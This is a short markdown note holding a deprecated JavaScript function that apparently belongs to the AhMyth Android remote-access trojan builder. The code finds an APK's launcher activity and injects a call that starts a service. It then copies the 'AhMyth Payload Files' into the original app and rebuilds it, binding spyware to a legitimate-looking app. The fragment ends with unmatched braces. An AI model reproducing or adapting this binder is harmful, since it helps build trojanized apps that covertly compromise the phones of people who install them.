## Bind on Launch function for Linux & OS X 

DEPRECATED (but stored just incase)
```js

                // This makes use of the Unix 'find' command in order to locate an APK's launcher activity
                $appCtrl.Log("Locating Launcher Activity...")
                $appCtrl.Log();
                exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
                  var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                  if (error !== null) {
                      $appCtrl.Log("Cannot Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
                      $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                      $appCtrl.Log();
                      return;
                    }
                    
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                    $appCtrl.Log("Fetching Launcher Activity...")
                    $appCtrl.Log();
                    fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                        if (error) {
                            $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log('Please use the "On Boot" Method', CONSTANTS.logStatus.INFO);
                            $appCtrl.Log("to Template This APK", CONSTANTS.logStatus.INFO)
                            $appCtrl.Log();
                            return;
                        }

                        var regex = /\/(\S+)\./;
                        var str = (apkFolder, launcherPath);
                        var m = str.match(regex);

                        var startService = CONSTANTS.serviceSrc + apkFolder.split(apkFolder).join((m[1])) + CONSTANTS.serviceStart;


                        var key = CONSTANTS.orgAppKey;
                        $appCtrl.Log("Modifiying Launcher Activity...");
                        $appCtrl.Log();
                        var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Launcher Activity Failed', logStatus.FAIL);
                                $appCtrl.Log();
                                return;
                            }

                            var regex = /[^/]+\//;
                            var str = (apkFolder, launcherPath);
                            var m = str.match(regex);

                            var smaliFolder = m[0];

                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                            $appCtrl.Log();
                            fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                if (error) {
                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
                                    $appCtrl.Log();
                                    return;
                                }
                                
                                $appCtrl.GenerateApk(apkFolder)
                    
                            });

                        });

                    });

                });
                
            });

        });

    }
``` 
